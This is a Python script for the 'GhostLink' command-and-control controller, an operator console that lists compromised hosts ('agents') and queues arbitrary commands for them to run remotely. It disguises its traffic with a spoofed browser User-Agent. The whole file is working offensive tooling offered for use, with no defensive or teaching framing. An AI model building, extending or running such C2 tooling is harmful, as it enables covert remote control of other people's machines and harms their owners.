#!/usr/bin/env python3
"""
GhostLink C2 Controller
Interactive command center to control agents
"""

import requests
import json
import sys
from tabulate import tabulate

C2_SERVER = "http://127.0.0.1:8888"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Content-Type": "application/json"
}

def get_agents():
    """Fetch list of connected agents"""
    try:
        response = requests.get(f"{C2_SERVER}/agents", headers=HEADERS, timeout=5)
        if response.status_code == 200:
            return response.json()
        else:
            print(f"[-] Failed to get agents: {response.status_code}")
            return []
    except Exception as e:
        print(f"[-] Connection error: {e}")
        return []

def send_command(agent_id, command):
    """Send command to agent"""
    try:
        payload = {
            "agent_id": agent_id,
            "command": command
        }
        
        response = requests.post(
            f"{C2_SERVER}/send_command",
            json=payload,
            headers=HEADERS,
            timeout=5
        )
        
        if response.status_code == 200:
            print(f"[+] Command queued for {agent_id}: {command}")
            return True
        else:
            print(f"[-] Failed to send command: {response.status_code}")
            return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def list_agents():
    """Display connected agents"""
    agents = get_agents()
    
    if not agents:
        print("[-] No agents connected")
        return
    
    table_data = []
    for agent in agents:
        table_data.append([
            agent['agent_id'],
            agent['hostname'],
            agent['ip'],
            agent['os'],
            agent['status'],
            agent['last_seen']
        ])
    
    headers = ["Agent ID", "Hostname", "IP", "OS", "Status", "Last Seen"]
    print("\n" + tabulate(table_data, headers=headers, tablefmt="grid") + "\n")

def interactive_shell():
    """Interactive command shell"""
    print("\n[*] GhostLink C2 Controller")
    print("[*] Type 'help' for commands\n")
    
    while True:
        try:
            cmd = input("GhostLink> ").strip()
            
            if not cmd:
                continue
            
            if cmd.lower() == "help":
                print("""
Commands:
  agents              - List all connected agents
  interact <id>       - Interact with specific agent
  send <id> <cmd>     - Send command to agent
  exit                - Exit controller
                """)
            
            elif cmd.lower() == "agents":
                list_agents()
            
            elif cmd.lower().startswith("send "):
                parts = cmd.split(" ", 2)
                if len(parts) >= 3:
                    agent_id = parts[1]
                    command = parts[2]
                    send_command(agent_id, command)
                else:
                    print("[-] Usage: send <agent_id> <command>")
            
            elif cmd.lower().startswith("interact "):
                agent_id = cmd.split(" ", 1)[1]
                interact_agent(agent_id)
            
            elif cmd.lower() == "exit":
                print("[*] Goodbye")
                break
            
            else:
                print("[-] Unknown command. Type 'help' for commands")
        
        except KeyboardInterrupt:
            print("\n[*] Exiting...")
            break
        except Exception as e:
            print(f"[-] Error: {e}")

def interact_agent(agent_id):
    """Interactive mode with specific agent"""
    print(f"\n[*] Interacting with {agent_id}")
    print("[*] Type 'exit' to return\n")
    
    while True:
        try:
            cmd = input(f"{agent_id}> ").strip()
            
            if cmd.lower() == "exit":
                break
            
            if not cmd:
                continue
            
            send_command(agent_id, cmd)
            print("[*] Command sent. Check results on next beacon...")
        
        except KeyboardInterrupt:
            print("\n[*] Returning to main menu...")
            break

if __name__ == "__main__":
    if len(sys.argv) > 1:
        # Command line mode
        if sys.argv[1] == "agents":
            list_agents()
        elif sys.argv[1] == "send" and len(sys.argv) >= 4:
            agent_id = sys.argv[2]
            command = " ".join(sys.argv[3:])
            send_command(agent_id, command)
        else:
            print("Usage: python Controller.py [agents | send <agent_id> <command>]")
    else:
        # Interactive mode
        interactive_shell()
